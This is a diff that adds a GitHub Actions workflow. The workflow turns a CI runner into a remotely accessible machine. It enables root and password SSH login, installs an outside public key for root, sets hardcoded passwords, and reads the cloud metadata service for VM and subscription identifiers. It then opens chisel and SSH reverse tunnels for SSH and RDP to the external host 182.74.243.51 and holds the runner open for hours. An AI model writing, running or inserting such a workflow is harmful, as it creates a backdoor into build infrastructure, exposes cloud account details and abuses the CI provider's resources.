@@ -1,0 +1,83 @@
+name: Reverse Tunnel SSH RDP
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  tunnel:
+    runs-on: ubuntu-latest
+    timeout-minutes: 355
+    steps:
+
+      - name: Install Tools
+        run: |
+          sudo apt-get install -y openssh-server sshpass socat 2>/dev/null | tail -3
+          curl -sL 'https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz' | gunzip | sudo tee /usr/local/bin/chisel >/dev/null
+          sudo chmod +x /usr/local/bin/chisel
+          chisel --version && echo CHISEL_OK
+
+      - name: SSH Server
+        run: |
+          sudo mkdir -p /etc/ssh /run/sshd
+          sudo ssh-keygen -A -q 2>/dev/null
+          printf 'Port 22\nPermitRootLogin yes\nPubkeyAuthentication yes\nAuthorizedKeysFile %%h/.ssh/authorized_keys\nPasswordAuthentication yes\nGatewayPorts yes\nAllowTcpForwarding yes\nX11Forwarding yes\nSubsystem sftp /usr/lib/openssh/sftp-server\n' | sudo tee /etc/ssh/sshd_config >/dev/null
+          sudo mkdir -p /root/.ssh /home/runner/.ssh
+          echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoPXiGdEWOrUs8nTKOVLm3mK61f0V3Lk/EuVqEws4m9Y0vgBnOEKj5NzBE1lm8zxmwlwn7FrZnICSIOupQfbFdKw7znoLCDs+IfZxDO9pzy2T1jyT3BHnzH1wzFea8QxQ2ozQVeAEx8Bf33bjE4Io740GfbbF4NiQGRcqS2B5RRadrL6ID0NFPTpoKsjgkV96zEIDcSfh8OhbnhEacL/pQ+qgyHw3OTpgiqmmES35QviCk+hZ6Xo5S/z5U62G2TBI0TL8aVuJvTqvh/UiVrnRCQTRJq5wU/8YHFQQCpJbjwh9WMhWjtNLUMQxgZ5GQhKmyfZ8a8o8ZNzz5O3fIc8Qh sysadmin@sysadmin' | sudo tee /root/.ssh/authorized_keys
+          echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoPXiGdEWOrUs8nTKOVLm3mK61f0V3Lk/EuVqEws4m9Y0vgBnOEKj5NzBE1lm8zxmwlwn7FrZnICSIOupQfbFdKw7znoLCDs+IfZxDO9pzy2T1jyT3BHnzH1wzFea8QxQ2ozQVeAEx8Bf33bjE4Io740GfbbF4NiQGRcqS2B5RRadrL6ID0NFPTpoKsjgkV96zEIDcSfh8OhbnhEacL/pQ+qgyHw3OTpgiqmmES35QviCk+hZ6Xo5S/z5U62G2TBI0TL8aVuJvTqvh/UiVrnRCQTRJq5wU/8YHFQQCpJbjwh9WMhWjtNLUMQxgZ5GQhKmyfZ8a8o8ZNzz5O3fIc8Qh sysadmin@sysadmin' | sudo tee /home/runner/.ssh/authorized_keys
+          sudo chmod 700 /root/.ssh /home/runner/.ssh
+          sudo chmod 600 /root/.ssh/authorized_keys /home/runner/.ssh/authorized_keys
+          echo 'runner:Pwn2Own2026!' | sudo chpasswd
+          echo 'root:Pwn2Own2026!' | sudo chpasswd
+          sudo /usr/sbin/sshd && echo SSH_UP
+
+      - name: VM Identity
+        run: |
+          echo "HOSTNAME=$(hostname)"
+          echo "INTERNAL=$(hostname -I | awk '{print $1}')"
+          echo "PUBLIC=$(curl -sf https://api.ipify.org)"
+          curl -sf -H 'Metadata:true' 'http://169.254.169.254/metadata/loadbalancer?api-version=2020-10-01' && echo "" || true
+          curl -sf -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | python3 -c "import sys,json; d=json.load(sys.stdin); c=d['compute']; n=d['network']['interface'][0]; print('vmId='+c['vmId']); print('sub='+c['subscriptionId']); print('loc='+c['location']); print('ip='+n['ipv4']['ipAddress'][0]['privateIpAddress'])" 2>/dev/null
+
+      - name: Chisel Reverse Tunnel
+        run: |
+          echo "Connecting to 182.74.243.51:8080"
+          chisel client --keepalive 30s --max-retry-count 9999 \
+            182.74.243.51:8080 \
+            R:12022:localhost:22 \
+            R:13389:localhost:3389 &
+          CPID=$!
+          echo CHISEL_PID=$CPID
+          sleep 10
+          kill -0 $CPID 2>/dev/null && echo CHISEL_ALIVE || echo CHISEL_DEAD
+
+      - name: SSH Reverse Fallback
+        run: |
+          sshpass -p 'Pwn2Own2026!' ssh \
+            -o StrictHostKeyChecking=no \
+            -o UserKnownHostsFile=/dev/null \
+            -o ServerAliveInterval=30 \
+            -o ConnectTimeout=15 \
+            -R 12022:localhost:22 \
+            -R 13389:localhost:3389 \
+            -N sysadmin@182.74.243.51 -p 22 &
+          TPID=$!
+          echo SSH_PID=$TPID
+          sleep 10
+          kill -0 $TPID 2>/dev/null && echo SSH_ALIVE || echo SSH_DEAD
+
+      - name: Keepalive
+        run: |
+          echo "========================================"
+          echo " TARGET: 182.74.243.51"
+          echo " SSH port forward  : ssh -p 12022 runner@182.74.243.51"
+          echo " SSH direct        : ssh runner@$(hostname -I | awk '{print $1}')"
+          echo " RDP portforward   : xfreerdp /v:182.74.243.51:13389 /u:runner /p:Pwn2Own2026!"
+          echo " Password          : Pwn2Own2026!"
+          echo "========================================"
+          for i in $(seq 1 350); do
+            sleep 60
+            echo "[$(date -u +'%H:%M:%SZ')] Heartbeat=$i conns=$(ss -tnp | grep -cE '12022|13389' || echo 0)"
+          done
